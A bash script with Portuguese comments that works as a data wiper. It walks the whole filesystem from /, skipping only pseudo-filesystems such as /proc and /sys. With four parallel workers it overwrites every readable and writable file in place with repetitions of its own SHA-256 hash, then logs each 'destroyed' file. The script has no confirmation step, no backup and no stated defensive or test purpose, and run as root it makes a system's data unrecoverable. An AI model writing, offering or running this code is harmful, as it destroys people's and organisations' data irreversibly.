#!/bin/bash

# Diretórios a ignorar
EXCLUDE_DIRS="/proc /sys /dev /run /tmp /mnt /media /lost+found"

# Quantidade de processos paralelos
PARALLELISM=4

# Log de arquivos destruídos
LOG_FILE="/destruicao.log"

# Gera lista de arquivos ignorando diretórios especiais
find_files() {
    local cmd="find / -type f"

    for dir in $EXCLUDE_DIRS; do
        cmd+=" -not -path \"$dir/*\""
    done

    eval $cmd 2>/dev/null
}

# Função para sobrescrever com hash
hash_and_destroy_file() {
    local file="$1"

    if [[ -f "$file" && -r "$file" && -w "$file" ]]; then
        local hash
        hash=$(sha256sum "$file" 2>/dev/null | awk '{print $1}')
        [[ -z "$hash" ]] && return

        local filesize
        filesize=$(stat -c%s "$file" 2>/dev/null)
        local hashlen=${#hash}
        local repeat=$((filesize / hashlen))
        local remainder=$((filesize % hashlen))

        {
            for _ in $(seq 1 "$repeat"); do
                echo -n "$hash"
            done
            dd if=/dev/zero bs=1 count=$remainder status=none
        } > "$file" 2>/dev/null

        echo "[+] Corrompido: $file" >> "$LOG_FILE"
        echo "[*] $file"
    fi
}

export -f hash_and_destroy_file
export LOG_FILE

# Executa com paralelismo
echo "[*] Iniciando destruição paralela com $PARALLELISM processos..."
find_files | xargs -n 1 -P "$PARALLELISM" -I {} bash -c 'hash_and_destroy_file "$@"' _ {}

echo "[✓] Finalizado. Arquivos destruídos listados em $LOG_FILE"
